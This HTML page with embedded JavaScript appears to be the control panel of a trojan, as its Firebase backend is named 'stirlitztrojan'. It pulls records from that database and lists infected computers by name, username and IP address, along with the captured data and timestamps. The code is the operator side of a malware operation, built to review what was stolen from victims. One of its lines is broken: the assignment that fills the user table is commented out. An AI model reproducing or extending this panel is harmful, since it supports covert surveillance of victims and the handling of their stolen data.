<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="UTF-8">
    <title>Application</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.firebase.com/js/client/2.4.2/firebase.js"></script>
    <style>
    .wrapword{
      white-space: -moz-pre-wrap !important;  /* Mozilla, since 1999 */
      white-space: -webkit-pre-wrap;          /*Chrome & Safari */ 
      white-space: -pre-wrap;                 /* Opera 4-6 */
      white-space: -o-pre-wrap;               /* Opera 7 */
      white-space: pre-wrap;                  /* css-3 */
      word-wrap: break-word;                  /* Internet Explorer 5.5+ */
      word-break: break-all;
      white-space: normal;
    }
    .nowrapword{
      white-space: nowrap;
    }
    table, tr, th, td{
      border: 1px solid #000000;
    }
    table{
      width:100%;
    }
    tr{
      background-color: #cccccc;
    }
    td, th { 
      display: table-cell;
      vertical-align: top; 
      text-align: left;
      padding: 10px;
    }
    .line{
      background-color:#000000;
    }
    </style>
  </head>
  <body>
    <h1>Users:</h1>
    <table id="userTable">
      <tr><th>Computer</th><th>Username</th><th>IP</th></tr>
      <tr class="line"><th colspan="3"></th></tr>
    </table>
    <h1>Data:</h1>
    <table id="dataTable">
      <tr><th>Computer</th><th>Username</th><th>Data</th><th>Time</th><th>Date</th></tr>
      <tr class="line"><th colspan="5"></th></tr>
    </table>
    <div id="err"></div>
    <script>
    <!--
    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/");
    firebase.authWithPassword({email: prompt("Email:"), password: prompt("Password:")}, function(error, authData) {
      if (error) console.log("Login Failed!", error);
      else console.log("Authenticated successfully with payload:", authData);
    });
    
    var rows, color;
    firebase.once("value", function(snapshot) {
      /*
      rows = snapshot.child("info");
      if(rows["pas"].val()==prompt(""));
      rows = snapshot.child("user");*/
      color = "#cccccc";
      rows.forEach(function(row){
        var computer =  row.key().split("&")[0];
        var username =  row.key().split("&")[1];
        var ip =        ReplaceAll(row.key().split("&")[2], "-", ".");
        // New row:
        var tableRow = document.getElementById("userTable").insertRow(2);
        tableRow.style.backgroundColor = color;
        if(color == "#cccccc") color = "#aaaaaa";
        else color = "#cccccc";
        var tableCellComputer = tableRow.insertCell(0);
        tableCellComputer.className = "nowrapword";
        tableCellComputer.innerHTML = computer;
        var tableCellUsername = tableRow.insertCell(1);
        tableCellUsername.className = "nowrapword";
        tableCellUsername.innerHTML = username;
        var tableCellIp = tableRow.insertCell(2);
        tableCellIp.className = "nowrapword";
        tableCellIp.innerHTML = ip;
      });
      rows = snapshot.child("data");
      color = "#cccccc";
      rows.forEach(function(row){
        var computer = row.key().split(",")[0].split("&")[0];
        var username = row.key().split(",")[0].split("&")[1];
        var data = row.val();
        var time = row.key().split(",")[1].split("&")[1];
        var date = row.key().split(",")[1].split("&")[0];
        // New row:
        var tableRow = document.getElementById("dataTable").insertRow(2);
        tableRow.style.backgroundColor = color;
        if(color == "#cccccc") color = "#aaaaaa";
        else color = "#cccccc";
        var tableCellComputer = tableRow.insertCell(0);
        tableCellComputer.className = "nowrapword";
        tableCellComputer.innerHTML = computer;
        var tableCellUsername = tableRow.insertCell(1);
        tableCellUsername.className = "nowrapword";
        tableCellUsername.innerHTML = username;
        var tableCellData = tableRow.insertCell(2);
        tableCellData.className = "wrapword";
        tableCellData.innerHTML = data;
        var tableCellTime = tableRow.insertCell(3);
        tableCellTime.className = "nowrapword";
        tableCellTime.innerHTML = time;
        var tableCellDate = tableRow.insertCell(4);
        tableCellDate.className = "nowrapword";
        tableCellDate.innerHTML = date;
      });
    }, function (e) {
      document.getElementById("err").innerHTML = e.code;
    });
    function EscapeRegExp(str) {
      return str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    }
    function ReplaceAll(str, search, replacement){
      return str.replace(new RegExp(EscapeRegExp(search), 'g'), replacement);
    }
    -->
    </script>
    <p>Copyright 2016 "I"</p>
  </body>
</html>
